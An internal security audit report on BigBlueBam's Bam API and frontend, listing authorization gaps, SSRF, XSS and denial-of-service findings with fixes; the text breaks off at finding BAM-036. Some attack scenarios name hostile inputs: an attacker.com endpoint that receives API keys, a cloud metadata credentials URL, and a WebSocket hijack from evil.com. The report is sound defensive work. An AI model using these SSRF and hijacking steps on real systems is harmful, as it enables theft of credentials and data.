# BigBlueBam -- Bam Module Security Assessment

| Field              | Value                                                        |
|--------------------|--------------------------------------------------------------|
| **Date**           | 2026-04-09                                                   |
| **Scope**          | Bam API (`apps/api/`) and Bam Frontend (`apps/frontend/`)    |
| **Methodology**    | Automated multi-agent source-code audit (10 parallel agents)  |
| **Agents**         | Auth & Session, Input Validation, Authorization (RBAC), Data Exposure & XSS, File Upload, WebSocket, Rate Limiting & DoS, Business Logic, Cryptography, Dependencies & Config |
| **Classification** | INTERNAL -- CONFIDENTIAL                                     |
| **Prepared for**   | BigBlueBam Engineering & Security Leadership                 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Finding Counts by Severity](#2-finding-counts-by-severity)
3. [Critical Remediation Path](#3-critical-remediation-path)
4. [Detailed Findings](#4-detailed-findings)
   - [Critical](#41-critical)
   - [High](#42-high)
   - [Medium](#43-medium)
   - [Low](#44-low)
   - [Informational](#45-informational)
5. [Methodology Notes](#5-methodology-notes)
6. [Appendix: Agent Coverage Map](#6-appendix-agent-coverage-map)

---

## 1. Executive Summary

This assessment consolidates findings from 10 specialized security audit agents that independently analyzed the BigBlueBam Bam API and Frontend source code. After deduplication, **53 unique findings** were identified across the codebase.

The most severe class of issues centers on **missing authorization boundaries** -- multiple API endpoints enforce authentication but fail to verify that the authenticated user has legitimate access to the target resource's project or organization. This pattern allows any authenticated user to read, modify, or delete resources belonging to other projects and organizations. A second critical concern is **hardcoded cryptographic material** used to encrypt LLM provider API keys, which would allow an attacker with read access to the database to decrypt every stored third-party API key.

WebSocket room subscriptions lack authorization checks entirely, enabling cross-project and cross-user real-time data interception. Import endpoints are unauthenticated at the project-role level, allowing any logged-in user to inject tasks into any project. File downloads are completely unauthenticated, exposing all uploaded attachments to the public internet.

The overall security posture requires **immediate remediation of authorization gaps** before any production deployment with multi-tenant data. The majority of high-severity issues share a common root cause (missing `requireProjectRole` middleware or missing org-scoping in SQL queries) and can be addressed systematically.

---

## 2. Finding Counts by Severity

| Severity        | Count |
|-----------------|-------|
| **Critical**    | 4     |
| **High**        | 16    |
| **Medium**      | 23    |
| **Low**         | 10    |
| **Informational** | 0   |
| **Total**       | **53** |

---

## 3. Critical Remediation Path

The following 10 fixes are listed in priority order. Completing these addresses the majority of exploitable risk surface.

| Priority | Finding ID | Title | Effort Estimate |
|----------|-----------|-------|-----------------|
| 1 | BAM-001 | Missing org isolation on project-scoped read endpoints | 2-3 days |
| 2 | BAM-002 | WebSocket room subscription lacks authorization | 1 day |
| 3 | BAM-003 | Hardcoded fallback encryption key for LLM API keys | 0.5 day |
| 4 | BAM-004 | Import endpoints missing project-role authorization | 1 day |
| 5 | BAM-005 | PATCH/DELETE on tasks missing project membership check | 1 day |
| 6 | BAM-008 | Unauthenticated file download endpoint | 0.5 day |
| 7 | BAM-009 | SSRF via LLM provider `api_endpoint` field | 1 day |
| 8 | BAM-010 | SSRF via Slack webhook URL | 0.5 day |
| 9 | BAM-007 | Bulk operations bypass per-task authorization | 1 day |
| 10 | BAM-011 | Webhook secrets stored and returned in plaintext | 1 day |

**Estimated total for top-10 remediation: 8.5-9.5 engineering days.**

---

## 4. Detailed Findings

### 4.1 Critical

---

#### BAM-001: Missing Organization Isolation on Project-Scoped Read Endpoints

| Field | Value |
|-------|-------|
| **ID** | BAM-001 |
| **Severity** | Critical |
| **Affected Files** | `apps/api/src/routes/task.routes.ts`, `apps/api/src/routes/sprint.routes.ts`, `apps/api/src/routes/phase.routes.ts`, `apps/api/src/routes/comment.routes.ts`, `apps/api/src/routes/label.routes.ts`, `apps/api/src/routes/epic.routes.ts` |

**Description:**
Multiple project-scoped GET endpoints (task lists, board state, sprints, phases, labels, epics, comments) use only `requireAuth` as their pre-handler. They accept a project ID from the URL path and query the database directly without verifying that (a) the project belongs to the caller's organization, or (b) the caller is a member of that project. Any authenticated user can enumerate and read data from any project across any organization by supplying arbitrary project UUIDs.

**Attack Scenario:**
1. Attacker registers a free account in Organization A.
2. Attacker obtains or guesses a project UUID from Organization B (e.g., from error messages, Slack links, or UUID enumeration).
3. Attacker calls `GET /projects/{orgB_project_id}/tasks` and receives the full task list, including titles, descriptions, assignees, custom fields, and comments.
4. Attacker repeats for `/projects/{id}/board`, `/projects/{id}/sprints`, etc.

**Recommended Fix:**
Add `requireProjectRole('viewer', 'member', 'admin')` to the pre-handler chain of every project-scoped read endpoint. Additionally, add an org-isolation guard early in the middleware that verifies `project.org_id === request.user.org_id` (or that the user has a project membership row) before any query executes. Consider creating a shared `requireProjectAccess` middleware that combines both checks.

---

#### BAM-002: WebSocket Room Subscription Lacks Authorization

| Field | Value |
|-------|-------|
| **ID** | BAM-002 |
| **Severity** | Critical |
| **Affected Files** | `apps/api/src/plugins/websocket.ts` (lines 186-210) |

**Description:**
The WebSocket message handler allows any authenticated user to subscribe to any `project:*` or `user:*` room by sending a `{"type":"subscribe","room":"project:<uuid>"}` message. There is no check that the subscribing user is a member of the target project or that the `user:*` room belongs to them. This grants real-time access to all events broadcast to that room, including task creation, updates, deletions, comments, and sprint changes.

**Attack Scenario:**
1. Attacker authenticates via a valid session cookie.
2. Attacker opens a WebSocket connection to `/ws`.
3. Attacker sends `{"type":"subscribe","room":"project:<victim_project_id>"}`.
4. Attacker receives every real-time event for that project, including task titles, assignee changes, and comment content.
5. Alternatively, attacker subscribes to `user:<victim_user_id>` and intercepts personal notifications.

**Recommended Fix:**
Before adding a connection to a room, validate membership:
- For `project:*` rooms: query `project_memberships` to confirm the authenticated user is a member.
- For `user:*` rooms: confirm `msg.room === 'user:' + conn.user.id`.
- Reject unauthorized subscriptions with an error frame and do not call `addToRoom`.

---

#### BAM-003: Hardcoded Fallback Encryption Key for LLM API Keys

| Field | Value |
|-------|-------|
| **ID** | BAM-003 |
| **Severity** | Critical |
| **Affected Files** | `apps/api/src/services/llm-provider.service.ts` (line 14) |

**Description:**
The `getEncryptionKey()` function falls back to the string `'default-dev-secret-change-me'` when `SESSION_SECRET` is not set:
```typescript
const secret = process.env.SESSION_SECRET || 'default-dev-secret-change-me';
```
While `SESSION_SECRET` is required in `env.ts`, the encryption service reads `process.env` directly, bypassing the validated env object. If the variable is unset at the process level (e.g., due to a deployment misconfiguration or running outside Docker), all LLM provider API keys (Anthropic, OpenAI, etc.) are encrypted with a publicly known key. Additionally, the KDF uses a static salt `'llm-provider-salt'`, meaning the derived key is identical across all deployments using the same `SESSION_SECRET`.

**Attack Scenario:**
1. Attacker gains read access to the `llm_providers` table (via SQL injection, backup exposure, or a compromised read-replica).
2. Attacker derives the encryption key using the hardcoded fallback and static salt.
3. Attacker decrypts every `api_key_encrypted` value and obtains valid API keys for Anthropic, OpenAI, or other LLM providers.
4. Attacker uses the stolen keys to consume API quota or exfiltrate data from connected AI services.

**Recommended Fix:**
1. Remove the fallback entirely -- crash the process if `SESSION_SECRET` (or a dedicated `LLM_ENCRYPTION_KEY`) is not set.
2. Use the validated `env.SESSION_SECRET` from `env.ts` instead of reading `process.env` directly.
3. Replace the static salt with a per-row random salt stored alongside the ciphertext (or derive a unique salt from a combination of the row ID and a server-level pepper).
4. Rotate all existing encrypted keys after deploying the fix.

---

#### BAM-004: Import Endpoints Missing Project-Role Authorization

| Field | Value |
|-------|-------|
| **ID** | BAM-004 |
| **Severity** | Critical |
| **Affected Files** | `apps/api/src/routes/import.routes.ts` (lines 161, 269, 390, 486) |

**Description:**
All four import endpoints (`/projects/:id/import/csv`, `/trello`, `/jira`, `/github`) use only `requireAuth` in their pre-handler chain. They do not verify that the authenticated user is a member of the target project or has an appropriate project role. Any authenticated user can inject tasks, labels, phases, and sprints into any project in any organization.

**Attack Scenario:**
1. Attacker authenticates with a valid account.
2. Attacker calls `POST /projects/{victim_project_id}/import/csv` with crafted rows.
3. Tasks are created in the victim project, and new phases/labels are auto-created as side effects.
4. This can be used for data pollution, social engineering (injecting tasks that appear legitimate), or denial of service (creating thousands of tasks).

**Recommended Fix:**
Add `requireProjectRole('admin', 'member')`, `requireMinRole('member')`, and `requireScope('read_write')` to all import route pre-handlers. Additionally, add array-length limits on the `rows`/`issues`/`lists` arrays to prevent DoS (see BAM-030).

---

### 4.2 High

---

#### BAM-005: PATCH/DELETE on Tasks Missing Project Membership Check

| Field | Value |
|-------|-------|
| **ID** | BAM-005 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/task.routes.ts` (lines 204-266) |

**Description:**
The `PATCH /tasks/:id` and `DELETE /tasks/:id` endpoints verify org-level role (`requireMinRole('member')`) and API key scope but do not check that the authenticated user has membership in the task's project. An authenticated member of Organization A can modify or delete tasks in any project within the same organization (or potentially cross-org if BAM-001 is also exploited).

**Attack Scenario:**
An authenticated user with `member` role in one project can call `PATCH /tasks/{task_id_from_another_project}` to change the task's title, assignee, priority, or description. They can also call `DELETE /tasks/{task_id}` to destroy tasks in projects they were never invited to.

**Recommended Fix:**
After fetching the task, verify `projectMemberships` for `task.project_id` and `request.user.id` before allowing the mutation. Alternatively, add a `requireProjectRoleForTask` middleware that resolves the task's project and checks membership.

---

#### BAM-006: Task Duplicate Endpoint Missing Project Authorization

| Field | Value |
|-------|-------|
| **ID** | BAM-006 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/task.routes.ts` (lines 279-435) |

**Description:**
The `POST /tasks/:id/duplicate` endpoint fetches the original task and duplicates it (including subtasks) without verifying that the caller is a member of the task's project. Any authenticated member can clone tasks from projects they do not belong to.

**Attack Scenario:**
Attacker calls `POST /tasks/{foreign_task_id}/duplicate` to clone a task (and its subtasks) from a restricted project into the same project, receiving the full task data in the response.

**Recommended Fix:**
After fetching the original task, check that the caller has membership in `original.project_id` before proceeding with the duplication.

---

#### BAM-007: Bulk Operations Bypass Per-Task Authorization

| Field | Value |
|-------|-------|
| **ID** | BAM-007 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/task.routes.ts` (lines 268-276), `apps/api/src/services/task.service.ts` |

**Description:**
The `POST /tasks/bulk` endpoint accepts an array of task IDs and operations, then dispatches them via `taskService.bulkOperations`. There is no per-task project membership check -- the caller only needs `requireMinRole('member')` at the org level. An attacker can include task IDs from multiple foreign projects in a single bulk request.

**Attack Scenario:**
Attacker constructs a bulk update request targeting task IDs from projects they do not belong to, changing assignees, priorities, or phases across the organization. No array-size limit is enforced, amplifying the impact.

**Recommended Fix:**
1. For each task ID in the bulk request, resolve the task's `project_id` and verify the caller's project membership before applying the operation.
2. Enforce a maximum array size (e.g., 100 items) to prevent DoS.
3. Return per-item error details for unauthorized tasks rather than failing silently.

---

#### BAM-008: Unauthenticated File Download Endpoint

| Field | Value |
|-------|-------|
| **ID** | BAM-008 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/upload.routes.ts` (lines 99-133) |

**Description:**
The `GET /files/*` endpoint has no pre-handler -- it is completely unauthenticated. Any person (including unauthenticated internet users) who knows or guesses a file key can download any uploaded attachment. The file key format (`uploads/{uuid}-{filename}`) is partially guessable if the UUID generation is predictable or if keys are leaked via other endpoints.

**Attack Scenario:**
1. Attacker observes a file URL in a shared link, email, or API response.
2. Attacker accesses the URL without any authentication.
3. Attacker downloads confidential documents (contracts, designs, credentials).
4. Attacker can also enumerate file keys by brute-forcing the UUID prefix.

**Recommended Fix:**
1. Add `requireAuth` as a minimum pre-handler on `GET /files/*`.
2. For stricter isolation, resolve the attachment's associated task and project, then verify the caller's project membership.
3. Alternatively, serve files via short-lived, signed URLs generated on-demand by an authenticated endpoint.

---

#### BAM-009: SSRF via LLM Provider `api_endpoint` Field

| Field | Value |
|-------|-------|
| **ID** | BAM-009 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/llm-provider.routes.ts`, `apps/api/src/services/llm-provider.service.ts` |

**Description:**
The LLM provider create/update endpoints accept an `api_endpoint` URL that is validated only as a syntactically valid URL (`z.string().url()`). When the provider is tested via `POST /llm-providers/:id/test`, the server makes an outbound HTTP request to this URL, carrying the decrypted API key in the `Authorization` header. An attacker can set `api_endpoint` to an internal network address (e.g., `http://169.254.169.254/latest/meta-data/` or `http://postgres:5432/`) to perform Server-Side Request Forgery, and the request will include the victim's API key.

**Attack Scenario:**
1. Attacker (with `member` role) creates an LLM provider with `api_endpoint: "https://attacker.com/steal"` and a dummy `api_key`.
2. Alternatively, attacker sets `api_endpoint` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to extract cloud IAM credentials.
3. Attacker calls `POST /llm-providers/:id/test`.
4. The server sends the request to the attacker-controlled URL or internal service.

**Recommended Fix:**
1. Validate that `api_endpoint` resolves to a public IP address (block RFC 1918, link-local, loopback, and cloud metadata ranges).
2. Maintain an allowlist of known provider domains (e.g., `api.anthropic.com`, `api.openai.com`).
3. Use a dedicated HTTP client with DNS rebinding protections and a short timeout.

---

#### BAM-010: SSRF via Slack Webhook URL

| Field | Value |
|-------|-------|
| **ID** | BAM-010 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/slack-integration.routes.ts`, `apps/api/src/services/slack-notify.service.ts` |

**Description:**
The Slack integration upsert endpoint validates `webhook_url` only as `z.string().url()`. When the test endpoint or event notification fires, the server POSTs to this URL from the internal network. An attacker with project admin access can set the webhook to an internal address and exfiltrate data via the notification payload.

**Attack Scenario:**
1. Project admin sets `webhook_url` to `http://internal-service:8080/admin/`.
2. On the next task creation event, the server sends a POST with task details to the internal service.
3. Alternatively, the admin uses the test endpoint to probe internal network topology.

**Recommended Fix:**
Apply the same SSRF protections as BAM-009: validate that the URL resolves to a public IP, block private/loopback/metadata ranges, and optionally restrict to `hooks.slack.com` domains.

---

#### BAM-011: Webhook Secrets Stored and Returned in Plaintext

| Field | Value |
|-------|-------|
| **ID** | BAM-011 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/webhook.routes.ts` (lines 43-55, 75-79), `apps/api/src/db/schema/webhooks.ts` |

**Description:**
Webhook secrets are stored as plaintext in the `webhooks.secret` column. The create and update endpoints return the full webhook row (via `.returning()`), which includes the `secret` field in the API response. Any user who can read webhook configuration can see the signing secret, and database compromise exposes all webhook secrets.

**Attack Scenario:**
1. Attacker with read access to the webhooks API obtains the webhook secret.
2. Attacker forges webhook payloads that pass HMAC verification on the receiving end.
3. Alternatively, database backup exposure reveals all webhook secrets in cleartext.

**Recommended Fix:**
1. Hash webhook secrets at rest (Argon2id or HMAC-SHA256 with a server key), storing only the hash.
2. Use the plaintext secret for HMAC signing at delivery time by requiring it to be provided at creation and never stored reversibly.
3. Exclude `secret` from all `.returning()` and list responses -- only show it once at creation time.

---

#### BAM-012: Phase, Label, Epic CRUD Missing Project Scope Check

| Field | Value |
|-------|-------|
| **ID** | BAM-012 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/phase.routes.ts`, `apps/api/src/routes/label.routes.ts`, `apps/api/src/routes/epic.routes.ts`, `apps/api/src/routes/custom-field.routes.ts` |

**Description:**
Update and delete operations on phases, labels, epics, and custom field definitions (`PATCH /phases/:id`, `DELETE /labels/:id`, etc.) operate on the entity ID directly without verifying that the entity belongs to a project the caller has access to. This allows cross-project modification of project configuration entities.

**Attack Scenario:**
Attacker obtains a phase UUID from a foreign project and calls `DELETE /phases/{foreign_phase_id}`, removing a phase from a project they do not belong to, which may cascade-affect tasks in that phase.

**Recommended Fix:**
For each mutation endpoint on project-scoped entities, resolve the entity's `project_id` and verify the caller's project membership before applying the change.

---

#### BAM-013: Attachment Delete Without Ownership Check

| Field | Value |
|-------|-------|
| **ID** | BAM-013 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/attachment.routes.ts` |

**Description:**
The attachment delete endpoint does not verify that the caller uploaded the attachment or has admin access to the task's project. Any authenticated user can delete any attachment by ID.

**Attack Scenario:**
Attacker deletes critical attachments (contracts, specifications) from tasks they have no access to, causing data loss. The stored file in MinIO is also not deleted (orphaned), but the database reference is removed.

**Recommended Fix:**
Check that `attachment.uploaded_by === request.user.id` or that the caller has admin role in the attachment's task's project. Also delete the MinIO object when the database row is removed.

---

#### BAM-014: Sprint CRUD Missing Project Membership Check

| Field | Value |
|-------|-------|
| **ID** | BAM-014 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/sprint.routes.ts` |

**Description:**
`GET /sprints/:id`, `PATCH /sprints/:id`, and sprint completion endpoints operate on the sprint ID without verifying the caller's membership in the sprint's project. While sprint creation correctly uses `requireProjectRole`, read and update operations do not.

**Attack Scenario:**
Attacker reads sprint details (goals, dates, status) from foreign projects or modifies sprint status/dates to disrupt another team's workflow.

**Recommended Fix:**
Resolve `sprint.project_id` and verify project membership before serving or mutating sprint data.

---

#### BAM-015: Comment Endpoints Missing Project Membership Check

| Field | Value |
|-------|-------|
| **ID** | BAM-015 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/comment.routes.ts` |

**Description:**
Comment list, create, update, and delete endpoints accept a task ID without verifying the caller's membership in the task's project. Any authenticated user can read or post comments on any task.

**Attack Scenario:**
Attacker reads sensitive discussion in comments on tasks from other projects, or injects misleading comments to manipulate team decisions.

**Recommended Fix:**
Resolve the task's `project_id` from the task ID and verify project membership before any comment operation.

---

#### BAM-016: `inviteMember` Returns `password_hash` in Response

| Field | Value |
|-------|-------|
| **ID** | BAM-016 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/org.routes.ts`, `apps/api/src/services/org.service.ts` |

**Description:**
When a new user is created via the member invitation flow, the API response includes the full user row from `users.*`, which includes the `password_hash` (Argon2id) column. While the hash itself is computationally expensive to crack, returning it violates defense-in-depth and leaks information that should never leave the server.

**Attack Scenario:**
1. Org admin invites a new member.
2. API response contains `password_hash` in the returned user object.
3. An attacker intercepting the response (MitM, log aggregation, client-side JavaScript access) obtains the hash.
4. Attacker performs offline brute-force against the Argon2id hash.

**Recommended Fix:**
Explicitly select only safe columns in the invitation service's user creation query. Never include `password_hash` in any API response. Create a shared `safeUserColumns` constant used across all user-returning queries.

---

#### BAM-017: Regex-Based HTML Sanitizer is Bypassable

| Field | Value |
|-------|-------|
| **ID** | BAM-017 |
| **Severity** | High |
| **Affected Files** | `apps/frontend/src/lib/markdown.ts` |

**Description:**
The frontend uses a regex-based approach to sanitize HTML in rich-text rendering. Regex-based HTML sanitization is fundamentally insecure and can be bypassed with malformed HTML, encoding tricks, or mutation XSS techniques. If task descriptions or comments contain user-supplied HTML that passes through this sanitizer, stored XSS is possible.

**Attack Scenario:**
Attacker creates a task with a description containing a crafted XSS payload that bypasses the regex sanitizer. When another user views the task, the script executes in their browser session, potentially stealing session cookies or performing actions on their behalf.

**Recommended Fix:**
Replace the regex sanitizer with a proper DOM-based sanitizer such as DOMPurify. Configure it with a strict allowlist of tags and attributes. Apply sanitization on both the server side (before storage) and the client side (before rendering).

---

#### BAM-018: No Magic-Byte Validation on File Uploads

| Field | Value |
|-------|-------|
| **ID** | BAM-018 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/upload.routes.ts` (lines 20-24, 52-53) |

**Description:**
File upload validation relies solely on the client-provided MIME type (`file.mimetype`). There is no server-side verification of the file's actual content via magic-byte (file signature) inspection. An attacker can upload a malicious file (e.g., an HTML file with JavaScript, or an executable) by simply setting the Content-Type header to `image/png`.

**Attack Scenario:**
1. Attacker uploads an HTML file containing JavaScript, with `Content-Type: image/png`.
2. The file is stored in MinIO and served via `GET /files/*` (unauthenticated, per BAM-008).
3. When a victim visits the file URL, the browser renders the HTML and executes the script.
4. Combined with BAM-008 (no auth), this enables stored XSS accessible to anyone.

**Recommended Fix:**
1. Install the `file-type` npm package and validate magic bytes against the claimed MIME type.
2. Reject uploads where the detected type does not match the declared type.
3. Add `X-Content-Type-Options: nosniff` to file download responses.
4. For extra safety, re-encode images through a processing pipeline (e.g., Sharp) to strip embedded payloads.

---

#### BAM-019: Cross-Site WebSocket Hijacking (No Origin Check)

| Field | Value |
|-------|-------|
| **ID** | BAM-019 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/plugins/websocket.ts` |

**Description:**
The WebSocket upgrade handler does not validate the `Origin` header. A malicious website can open a WebSocket connection to the Bam API using the victim's session cookie (sent automatically by the browser), effectively hijacking the WebSocket connection.

**Attack Scenario:**
1. Victim visits `https://evil.com` while logged into BigBlueBam.
2. The malicious page opens `new WebSocket('wss://bigbluebam.example.com/ws')`.
3. The browser attaches the session cookie automatically.
4. The attacker's JavaScript subscribes to rooms and receives real-time events.

**Recommended Fix:**
Validate the `Origin` header in the WebSocket upgrade handler against the configured `CORS_ORIGIN`. Reject connections from unrecognized origins with a 403 response before upgrading the connection.

---

#### BAM-020: Export Endpoint -- No Rate Limit, Unbounded Query

| Field | Value |
|-------|-------|
| **ID** | BAM-020 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/routes/export.routes.ts` |

**Description:**
The `POST /projects/:id/export` endpoint loads ALL tasks for a project into memory with no pagination, no row limit, and no rate limiting. A project with millions of tasks (e.g., after a bulk import attack) could exhaust server memory and crash the Node.js process.

**Attack Scenario:**
1. Attacker imports 1,000,000 tasks into a project (possible due to BAM-004 and BAM-030).
2. Attacker calls `POST /projects/{id}/export` with `format: "json"`.
3. The server attempts to load all 1M tasks into memory, causing an OOM crash.
4. Repeated calls cause denial of service.

**Recommended Fix:**
1. Add rate limiting to the export endpoint.
2. Implement streaming export (NDJSON or chunked CSV) instead of loading all rows into memory.
3. Add a maximum row limit (e.g., 50,000) with pagination or background job processing for larger exports.
4. Add `requireProjectRole` to gate access.

---

#### BAM-021: Uncapped Pagination Limit Allows Memory Exhaustion

| Field | Value |
|-------|-------|
| **ID** | BAM-021 |
| **Severity** | High |
| **Affected Files** | `apps/api/src/services/task.service.ts`, `apps/api/src/routes/task.routes.ts` |

**Description:**
The task list endpoint accepts a `limit` query parameter that is parsed as an integer with no upper bound. A caller can pass `limit=999999` to force the server to load an arbitrarily large result set into memory.

**Attack Scenario:**
Attacker calls `GET /projects/{id}/tasks?limit=999999` repeatedly, forcing the server to allocate large buffers for each response, leading to memory pressure and eventual OOM.

**Recommended Fix:**
Clamp the `limit` parameter to a reasonable maximum (e.g., 200) in the route handler before passing it to the service layer. Apply the same cap to all list endpoints.

---

### 4.3 Medium

---

#### BAM-022: `requireProjectRole` Extracts Wrong Param for Non-Project Routes

| Field | Value |
|-------|-------|
| **ID** | BAM-022 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/middleware/authorize.ts` (line 24) |

**Description:**
`requireProjectRole` extracts the project ID from `params.id`, which works for `/projects/:id/...` routes but fails silently for routes like `/tasks/:id` or `/sprints/:id` where `params.id` refers to the entity, not the project. This means applying `requireProjectRole` to non-project-scoped routes provides no authorization.

**Recommended Fix:**
Create a variant `requireProjectRoleForEntity` that first resolves the entity's `project_id` from the database. Alternatively, accept an explicit parameter name (e.g., `requireProjectRole({ paramKey: 'projectId' })`).

---

#### BAM-023: ILIKE Injection via Unsanitized Search Parameters

| Field | Value |
|-------|-------|
| **ID** | BAM-023 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/services/task.service.ts` (line 432), `apps/api/src/routes/platform.routes.ts` (line 83), `apps/api/src/services/superuser-users.service.ts` (lines 90-91), `apps/api/src/routes/superuser.routes.ts` (lines 116-117) |

**Description:**
Search parameters are interpolated directly into `ilike(column, '%${search}%')` without escaping special LIKE characters (`%`, `_`, `\`). An attacker can craft search strings containing `%` to trigger full-table scans or extract data patterns.

**Recommended Fix:**
Create an `escapeLike(input: string)` utility that escapes `%`, `_`, and `\` before interpolation. Apply it to all `ilike()` calls.

---

#### BAM-024: Missing `X-Content-Type-Options: nosniff` on File Downloads

| Field | Value |
|-------|-------|
| **ID** | BAM-024 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/upload.routes.ts` (lines 117-120) |

**Description:**
The file download endpoint sets `Content-Type` from MinIO metadata but does not set `X-Content-Type-Options: nosniff`. Browsers may MIME-sniff the response and interpret non-HTML files as HTML, enabling XSS.

**Recommended Fix:**
Add `reply.header('X-Content-Type-Options', 'nosniff')` to the file download response. Also add `Content-Disposition: attachment` for non-image file types to force download rather than inline rendering.

---

#### BAM-025: No Body Size Limits on Import Endpoints

| Field | Value |
|-------|-------|
| **ID** | BAM-025 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/import.routes.ts` |

**Description:**
Import endpoints accept JSON bodies with no `bodyLimit` configuration on the route and no maximum array length on the `rows`/`issues`/`lists` arrays. The default Fastify body limit is 1MB, but this still allows hundreds of thousands of short rows. Combined with the lack of authorization (BAM-004), this enables mass data injection.

**Recommended Fix:**
1. Set an explicit `bodyLimit` on import routes (e.g., 5MB).
2. Add `.max(10000)` to the Zod array schemas for rows/issues/lists.
3. Process imports in batches with progress reporting for large imports.

---

#### BAM-026: Webhook URL Missing SSRF Protection

| Field | Value |
|-------|-------|
| **ID** | BAM-026 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/webhook.routes.ts` (line 37) |

**Description:**
The webhook create endpoint validates `url` as `z.string().url()` but does not block internal/private network addresses. When webhook events are delivered, the server makes outbound HTTP requests from the internal network.

**Recommended Fix:**
Apply the same SSRF protections as BAM-009 and BAM-010.

---

#### BAM-027: Session Grace Period Without Reaping

| Field | Value |
|-------|-------|
| **ID** | BAM-027 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/plugins/auth.ts` (line 316) |

**Description:**
Expired sessions remain valid for an additional 30 seconds (`+ 30_000`), and there is no background job to reap expired sessions from the database. Over time, the sessions table grows unboundedly. The 30-second grace period also means a "logged out" user retains access briefly after session expiration.

**Recommended Fix:**
1. Reduce or remove the grace period.
2. Add a periodic session cleanup job (e.g., via BullMQ) that deletes sessions where `expires_at < NOW() - INTERVAL '1 hour'`.

---

#### BAM-028: Account Lockout is Per-Email Only (DoS Vector)

| Field | Value |
|-------|-------|
| **ID** | BAM-028 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/lib/login-lockout.ts` |

**Description:**
Login lockout is tracked per email address only. An attacker can lock out any user's account by sending 5 failed login attempts with the target's email address. There is no IP-based component to the lockout logic.

**Recommended Fix:**
Implement a combined lockout strategy: lock the email after N failures from a single IP, and lock the IP after M total failures across all emails. Use CAPTCHA or progressive delays instead of hard lockout for the email dimension.

---

#### BAM-029: Admin Password Reset Returns Raw Password

| Field | Value |
|-------|-------|
| **ID** | BAM-029 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/superuser.routes.ts`, `apps/api/src/services/superuser-users.service.ts` |

**Description:**
When a SuperUser resets a user's password, the API generates a random password and returns it in the JSON response body. This plaintext password is logged in API access logs, may be cached by proxies, and is visible in browser network tabs.

**Recommended Fix:**
Instead of returning a plaintext password, generate a time-limited password reset token and email it to the user. If an immediate reset is required, send the temporary password via the SMTP email channel rather than in the API response.

---

#### BAM-030: No Row/Item Limit on Bulk and Import Operations

| Field | Value |
|-------|-------|
| **ID** | BAM-030 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/task.routes.ts` (bulk), `apps/api/src/routes/import.routes.ts` |

**Description:**
Neither the bulk task update endpoint nor the import endpoints enforce a maximum number of items per request. An attacker can send a single request with tens of thousands of operations, monopolizing database connections and CPU.

**Recommended Fix:**
Add `.max(100)` to the bulk update array schema and `.max(10000)` to import array schemas. Return a clear error when the limit is exceeded.

---

#### BAM-031: Time Entry Endpoints Missing Project Scope

| Field | Value |
|-------|-------|
| **ID** | BAM-031 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/time-entry.routes.ts` |

**Description:**
Time entry CRUD endpoints do not verify that the caller has membership in the task's project before creating, reading, or deleting time entries. An authenticated user can log or view time against any task.

**Recommended Fix:**
Resolve the task's `project_id` and verify project membership before allowing time entry operations.

---

#### BAM-032: Reaction Endpoints Missing Project Scope

| Field | Value |
|-------|-------|
| **ID** | BAM-032 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/reaction.routes.ts` |

**Description:**
Comment reaction toggle endpoints do not verify project membership. Any authenticated user can add or remove reactions on comments belonging to tasks in foreign projects.

**Recommended Fix:**
Resolve the comment's task's project and verify membership before allowing the reaction.

---

#### BAM-033: Attachment Upload/List Missing Project Scope

| Field | Value |
|-------|-------|
| **ID** | BAM-033 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/routes/attachment.routes.ts` |

**Description:**
Attachment upload and list endpoints for a task do not verify that the caller is a member of the task's project. Any authenticated user can upload files to or list attachments on any task.

**Recommended Fix:**
Resolve the task's `project_id` and verify project membership before allowing attachment operations.

---

#### BAM-034: `getUserById` Fetches All Columns

| Field | Value |
|-------|-------|
| **ID** | BAM-034 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/services/org.service.ts` |

**Description:**
The `getUserById` service function uses `SELECT *` from the users table, retrieving sensitive columns (`password_hash`, `totp_secret`, `email_verification_token`) even when only display information is needed. If the result is inadvertently passed to an API response, sensitive data leaks.

**Recommended Fix:**
Create a `safeUserSelect` constant listing only non-sensitive columns (`id`, `email`, `display_name`, `avatar_url`, `role`, `timezone`, `is_active`, `created_at`). Use it in all user queries that return data to clients.

---

#### BAM-035: Swagger/OpenAPI Exposed in Production

| Field | Value |
|-------|-------|
| **ID** | BAM-035 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/` (Fastify Swagger plugin registration) |

**Description:**
The Swagger documentation UI is registered without a `NODE_ENV` guard, making the full API schema available in production. This provides attackers with a complete map of all endpoints, parameters, and response schemas.

**Recommended Fix:**
Conditionally register `@fastify/swagger-ui` only when `NODE_ENV !== 'production'`, or protect it behind SuperUser authentication.

---

#### BAM-036: Error Handler Leaks Internal Details

| Field | Value |
|-------|-------|
| **ID** | BAM-036 |
| **Severity** | Medium |
| **Affected Files** | `apps/api/src/middleware/error-handler.ts` (lines 69-84) |

**Description:**
